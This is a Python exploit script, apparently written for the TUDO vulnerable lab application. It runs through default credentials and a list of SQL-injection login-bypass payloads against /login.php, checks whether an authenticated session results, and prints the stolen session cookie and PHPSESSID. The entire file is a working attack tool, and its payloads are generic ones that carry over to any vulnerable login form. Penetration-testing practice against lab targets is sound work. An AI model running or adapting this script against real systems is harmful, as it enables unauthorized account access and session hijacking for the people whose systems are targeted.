"""
Login bypass exploit for the TUDO lab application.

Usage:
  python login_bypass.py http://localhost:8000
  python login_bypass.py http://localhost:8000 --verify /profile.php
"""
import argparse
import sys
from urllib.parse import urljoin

try:
    import requests
except ImportError:
    requests = None


DEFAULT_PAYLOADS = [
    ("admin", "admin"),
    ("user1", "user1"),
    ("user2", "user2"),
    ("admin' OR '1'='1' -- ", "x"),
    ("admin' OR 1=1 -- ", "x"),
    ("' OR '1'='1' -- ", "x"),
    ("' OR 1=1 -- ", "x"),
    ("admin\" OR \"1\"=\"1\" -- ", "x"),
    ("admin\" OR 1=1 -- ", "x"),
    ("\" OR \"1\"=\"1\" -- ", "x"),
    ("\" OR 1=1 -- ", "x"),
    ("admin') OR ('1'='1' -- ", "x"),
    ("') OR ('1'='1' -- ", "x"),
    ("admin", "' OR '1'='1' -- "),
    ("admin", "' OR 1=1 -- "),
    ("admin", "\" OR \"1\"=\"1\" -- "),
    ("admin", "\" OR 1=1 -- "),
]

FAILURE_MARKERS = (
    "invalid",
    "incorrect",
    "wrong",
    "failed",
    "login error",
    "bad credentials",
    "neuspe",
    "pogre",
)

AUTH_MARKERS = (
    "logout",
    "profile",
    "admin",
    "upload",
    "motd",
    "description",
)


def normalize_base(url):
    return url.rstrip("/") + "/"


def endpoint(base, path):
    return urljoin(base, path.lstrip("/"))


def has_session_cookie(session):
    return any(cookie.name == "PHPSESSID" for cookie in session.cookies)


def looks_like_failed_login(response):
    body = response.text.lower()
    return any(marker in body for marker in FAILURE_MARKERS)


def looks_authenticated(response):
    body = response.text.lower()
    return any(marker in body for marker in AUTH_MARKERS)


def cookie_header(session):
    return "; ".join(f"{cookie.name}={cookie.value}" for cookie in session.cookies)


def phpsessid(session):
    for cookie in session.cookies:
        if cookie.name == "PHPSESSID":
            return cookie.value
    return None


def try_login(base, username, password, timeout):
    session = requests.Session()
    response = session.post(
        endpoint(base, "/login.php"),
        data={"username": username, "password": password},
        allow_redirects=True,
        timeout=timeout,
    )

    if not has_session_cookie(session):
        return None, response

    if looks_like_failed_login(response):
        return None, response

    return session, response


def verify_session(base, session, verify_path, timeout):
    response = session.get(endpoint(base, verify_path), allow_redirects=True, timeout=timeout)
    return response, looks_authenticated(response) and not looks_like_failed_login(response)


def main():
    parser = argparse.ArgumentParser(description="Exploit SQL-injection login bypass on /login.php.")
    parser.add_argument("target", help="Base URL, for example http://localhost:8000")
    parser.add_argument("--verify", default="/index.php", help="Authenticated page to verify after bypass")
    parser.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout in seconds")
    parser.add_argument("--verbose", action="store_true", help="Print every attempted payload")
    args = parser.parse_args()

    if requests is None:
        sys.exit("[-] Missing dependency: install it with `pip install requests`.")

    base = normalize_base(args.target)

    print(f"[*] Target: {base.rstrip('/')}")
    print("[*] Trying lab credentials and bypass payloads against /login.php...")

    last_response = None
    for username, password in DEFAULT_PAYLOADS:
        if args.verbose:
            print(f"    username={username!r} password={password!r}")

        try:
            session, response = try_login(base, username, password, args.timeout)
        except requests.RequestException as exc:
            sys.exit(f"[-] Request failed: {exc}")

        last_response = response
        if session is None:
            continue

        try:
            verify_response, verified = verify_session(base, session, args.verify, args.timeout)
        except requests.RequestException as exc:
            sys.exit(f"[-] Verification request failed: {exc}")

        if not verified:
            if args.verbose:
                print(f"    got PHPSESSID, but {args.verify} did not look authenticated")
            continue

        print("[+] Login bypass succeeded")
        print(f"[+] Username: {username!r}")
        print(f"[+] Password: {password!r}")
        print(f"[+] Verified on: {verify_response.url}")
        print(f"[=] Cookie: {cookie_header(session)}")

        sid = phpsessid(session)
        if sid:
            print(f"[=] PHPSESSID: {sid}")
        return

    status = last_response.status_code if last_response is not None else "no response"
    print(f"[-] Login bypass failed. Last status: {status}")
    print("[-] Try --verbose, or adjust payloads for the exact SQL syntax used by the app.")
    sys.exit(1)


if __name__ == "__main__":
    main()
